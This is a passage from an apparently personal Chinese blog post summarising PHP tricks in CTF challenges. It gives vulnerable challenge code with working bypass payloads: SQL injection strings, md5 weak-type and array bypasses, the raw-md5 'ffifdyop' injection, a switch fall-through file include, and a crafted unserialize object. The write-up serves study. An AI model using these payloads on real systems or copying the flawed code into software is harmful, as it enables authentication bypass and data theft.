        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\&#39; 转换为 &#39; 等等）。双反斜线（\\）被转换为单个反斜线（\）。
    }
    return htmlentities($str, ENT_QUOTES);
}
$username = @clean((string)$_GET[&#39;username&#39;]);
$password = @clean((string)$_GET[&#39;password&#39;]);
//$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;admin\&#39;\&#39; AND pass=\&#39;&#39;or 1 #&#39;\&#39;;&#39;;
$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) &lt; 1){
    die(&#39;Invalid password!&#39;);
}
echo $flag;
?&gt;</code></pre><p>key words:<code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p>
<h5 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h5><p><code>?username=admin\&#39;\&#39; AND pass=\&#39;&#39;or 1 #&amp;password=</code></p>
<h3 id="16密码md5比较绕过"><a href="#16密码md5比较绕过" class="headerlink" title="# 16密码md5比较绕过"></a># 16密码md5比较绕过</h3><p>这个有点没看懂，先记着。<br><strong>code</strong></p>
<pre><code>&lt;?php
if($_POST[user] &amp;&amp; $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39; $user &#39;&quot;));
  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
    //strcasecmp:0 - 如果两个字符串相等
      echo &quot;&lt;p&gt;Logged in! Key: flag{**************} &lt;/p&gt;&quot;;
  }
  else {
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
  }
}
?&gt;</code></pre><h5 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h5><p>key:<code>//select pw from ctf where user=&#39;&#39;and 0=1 union select  &#39;e10adc3949ba59abbe56e057f20f883e&#39; #</code></p>
<p><code>?user=&#39;and 0=1 union select  &#39;e10adc3949ba59abbe56e057f20f883e&#39; #&amp;pass=123456</code></p>
<h3 id="17-md5-函数-使用数组绕过"><a href="#17-md5-函数-使用数组绕过" class="headerlink" title="# 17 md5()函数===使用数组绕过"></a># 17 md5()函数===使用数组绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$flag = &#39;flag{test}&#39;;
if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) {
    if ($_GET[&#39;username&#39;] == $_GET[&#39;password&#39;])
        print &#39;Your password can not be your username.&#39;;
    else if (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))
        die(&#39;Flag: &#39;.$flag);
    else
        print &#39;Invalid password&#39;;
}
?&gt;</code></pre><h5 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h5><p>以前遇到过<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>?username=QNKCDZO&amp;password=240610708</code><br>因为==对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code>转成0了<br>也可以使用数组绕过<br><code>?username[]=1&amp;password[]=2</code><br>但这里是<code>===</code>，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值<br><code>?username[]=1&amp;password[]=2</code></p>
<h3 id="18-十六进制与数字比较"><a href="#18-十六进制与数字比较" class="headerlink" title="# 18 十六进制与数字比较"></a># 18 十六进制与数字比较</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
function noother_says_correct($temp)
{
    $flag = &#39;flag{test}&#39;;
    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值
    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值
    $number = &#39;3735929054&#39;;
    // Check all the input characters!
    for ($i = 0; $i &lt; strlen($number); $i++)
    {
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
        {
            // Aha, digit not allowed!
            return &quot;flase&quot;;
        }
    }
    if($number == $temp)
        return $flag;
}
$temp = $_GET[&#39;password&#39;];
echo noother_says_correct($temp);
?&gt;</code></pre><h5 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h5><p>将3735929054转为16进制<br>结果为：deadc0de<br>在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag<br><code>?password=0xdeadc0de</code></p>
<h3 id="19-数字验证正则绕过"><a href="#19-数字验证正则绕过" class="headerlink" title="# 19 数字验证正则绕过"></a># 19 数字验证正则绕过</h3><p>新玩意儿，从没见过。了解一下new! new! new!<br><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$flag = &#39;flag{test}&#39;;
if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;])
{
    $password = $_POST[&#39;password&#39;];
    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配
    {
        echo &#39;Wrong Format&#39;;
        exit;
    }
    while (TRUE)
    {
        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;
        if (6 &gt; preg_match_all($reg, $password, $arr))
            break;
        $c = 0;
        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母
        foreach ($ps as $pt)
        {
            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))
                $c += 1;
        }
        if ($c &lt; 3) break;
        //&gt;=3，必须包含四种类型三种与三种以上
        if (&quot;42&quot; == $password) echo $flag;
        else echo &#39;Wrong password&#39;;
        exit;
    }
}
?&gt;</code></pre><p>分析一波：<code>0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)</code>意思是要12个字符以上（非空格非TAB之外的内容）</p>
<pre><code>$reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;
if (6 &gt; preg_match_all($reg, $password, $arr))</code></pre><p>匹配到的次数要&gt;6</p>
<pre><code>$ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母
foreach ($ps as $pt)
{
    if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))
        $c += 1;
}
if ($c &lt; 3) break;</code></pre><p>要有大小写字符，数字，字符内容三种与三种以上</p>
<h5 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h5><pre><code>42.00e+00000000000
或
420.000000000e-1</code></pre><h3 id="20-弱类型整数大小比较绕过"><a href="#20-弱类型整数大小比较绕过" class="headerlink" title="# 20 弱类型整数大小比较绕过"></a># 20 弱类型整数大小比较绕过</h3><p>烦，弱类型怎么那么多。嘤！<br><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$flag = &quot;flag{test}&quot;;
$temp = $_GET[&#39;password&#39;];
is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    
if($temp&gt;1336){
    echo $flag;
}
?&gt;</code></pre><p><code>is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</code><br>不能是数字,但是又要&gt;1336</p>
<h5 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h5><p><code>?password=1337a</code></p>
<h3 id="21-md5-true-绕过注入"><a href="#21-md5-true-绕过注入" class="headerlink" title="# 21 md5()true 绕过注入"></a># 21 md5()true 绕过注入</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$link = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);
if (!$link) {
  die(&#39;Could not connect to MySQL: &#39; . mysql_error());
}
// 选择数据库
$db = mysql_select_db(&quot;security&quot;, $link);
if(!$db)
{
  echo &#39;select db error&#39;;
  exit();
}
// 执行sql
$password = $_GET[&#39;password&#39;];
$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;
var_dump($sql);
// SELECT * FROM users WHERE password = &#39;276f722736c95d99e921722cf9ed621c&#39;
$result=mysql_query($sql) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );
$row1 = mysql_fetch_row($result);
var_dump($row1);
mysql_close($link);
?&gt;</code></pre><p><code>$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>md5($password,true)<br>将md5后的hex转换成字符串</p>
<p>如果包含<code>&#39;or&#39;xxx</code>这样的字符串，那整个sql变成</p>
<p><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;xxx&#39;</code>就绕过了</p>
<p>字符串：ffifdyop</p>
<p>md5后，<code>276f722736c95d99e921722cf9ed621c</code><br>hex转换成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code></p>
<h5 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h5><p><code>?password=ffifdyop</code></p>
<h3 id="22-switch没有-break-字符与0比较绕过"><a href="#22-switch没有-break-字符与0比较绕过" class="headerlink" title="# 22  switch没有 break 字符与0比较绕过"></a># 22  switch没有 break 字符与0比较绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
// error_reporting(0);
if (isset($_GET[&#39;which&#39;]))
{
    $which = $_GET[&#39;which&#39;];
    switch ($which)
    {
    case 0:
    print(&#39;arg&#39;);
    // break;
    case 1:
    case 2:
        require_once $which.&#39;.php&#39;;
         echo $flag;
        break;
    default:
        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);
        break;
    }
}
?&gt;</code></pre><p>here:<br>让我们包含当前目录中的<code>flag.php</code>，给which为flag，这里会发现在case 0和case 1的时候，没有break，按照常规思维，应该是0比较不成功，进入比较1，然后比较2，再然后进入default，但是事实却不是这样，事实上，在 case 0的时候，字符串和0比较是相等的，进入了case 0的方法体，但是却没有break，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们which传入flag的时候，case 0比较进入了方法体，但是没有break，默认已经匹配成功，往下执行不再判断，进入2的时候，执行了<code>require_once flag.php</code></p>
<h5 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h5><p><code>?which=flag</code></p>
<h3 id="23-unserialize"><a href="#23-unserialize" class="headerlink" title="# 23 unserialize()"></a># 23 unserialize()</h3><p>刚刚学了一点序列化知识就看到这个<br><strong>code</strong></p>
<pre><code>&lt;?php
    require_once(&#39;shield.php&#39;);
    $x = new Shield();
    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
    if (!empty($g)) {
        $x = unserialize($g);
    }
    echo $x-&gt;readfile();
?&gt;
&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;
&lt;!-- shield.php --&gt;
&lt;?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = &#39;&#39;) {
            $this -&gt; file = $filename;
        }

        function readfile() {
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
                return @file_get_contents($this-&gt;file);
            }
        }
    }
?&gt;
&lt;!-- showimg.php --&gt;
&lt;?php
    $f = $_GET[&#39;img&#39;];
    if (!empty($f)) {
        $f = base64_decode($f);
        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
        //stripos — 查找字符串首次出现的位置（不区分大小写）
        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {
            readfile($f);
        } else {
            echo &quot;File not found!&quot;;
        }
    }
?&gt;</code></pre><p>说明：flag在<code>pctf.php</code>，但<code>showimg.php</code>中不允许直接读取<code>pctf.php</code>，只有在<code>index.php</code>中可以传入变量class<br>，index.php中Shield类的实例<code>$X = unserialize($g)</code>，<code>$g = $_GET[&#39;class&#39;];</code>，<code>$X</code>中不知<code>$filename</code>变量，但需要找的是：<code>$filename = &quot;pctf.php&quot;</code>，现$X已知，求传入的class变量值。<br>可以进行序列化操作：</p>
<pre><code>&lt;?php
require_once(&#39;shield.php&#39;);
$x = class Shield();
$g = serialize($x);
echo $g;
?&gt;
&lt;!-- shield.php --&gt;
&lt;?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = &#39;pctf.php&#39;) {
            $this -&gt; file = $filename;
        }

        function readfile() {
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
                return @file_get_contents($this-&gt;file);
            }
        }
    }
?&gt;</code></pre><p>得到<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
<h5 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h5><p><code>?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">CTF中常见PHP特性学习笔记</a></p>

            </div>
            <hr/>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            

    <div class="reprint" id="reprint-statement">
        <p class="reprint-tip">
            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
            <span>转载规则</span>
        </p>
        
            <div class="center-align">
                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                    <img alt=""
                         style="border-width:0"
                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                </a>
            </div>
            <br/>
            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                  property="dct:title" rel="dct:type">
                    《CTF中一些PHP问题小结》
                </span> 由
            <a xmlns:cc="http://creativecommons.org/ns#" href="/2018/03/18/CTF中一些PHP问题小结/" property="cc:attributionName"
               rel="cc:attributionURL">
                Gsuhy
            </a> 采用
            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                知识共享署名 4.0 国际许可协议
            </a>进行许可。
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>


        </div>
    </div>

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2018/04/08/CTF中一些PHP问题小结（补充）/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="CTF中一些PHP问题小结（续）">
                        
                        <span class="card-title">CTF中一些PHP问题小结（续）</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            接前一篇CTF中PHP问题
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-04-08
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category" target="_blank">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/" target="_blank">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/PHP/" target="_blank">
                        <span class="chip bg-color">PHP</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2018/02/07/python模块之re/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="python模块之re">
                        
                        <span class="card-title">python模块之re</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            python模块之re
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-02-07
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Python/" class="post-category" target="_blank">
                                    Python
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/python/" target="_blank">
                        <span class="chip bg-color">python</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Scorpio<br />'
            + '作者: Gsuhy<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fa fa-list"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).slideUp(500);
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).slideDown(500);
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>
    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.

            
                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
                <span class="white-color">50k</span>
            

            
			
                <br>
                
                <span id="busuanzi_container_site_pv">
                    <i class="fa fa-heart-o"></i>
                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
                </span>
                
                
                <span id="busuanzi_container_site_uv">
                    <i class="fa fa-users"></i>
                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
                </span>
                
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/mGsuhy/Gsuhy.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="mailto:Gsuhy@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1020040738" class="tooltipped" data-tooltip="QQ联系我: 1020040738" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->



    <script src="/libs/others/clicklove.js"></script>


    <script async src="/libs/others/busuanzi.pure.mini.js"></script>


</body>
</html>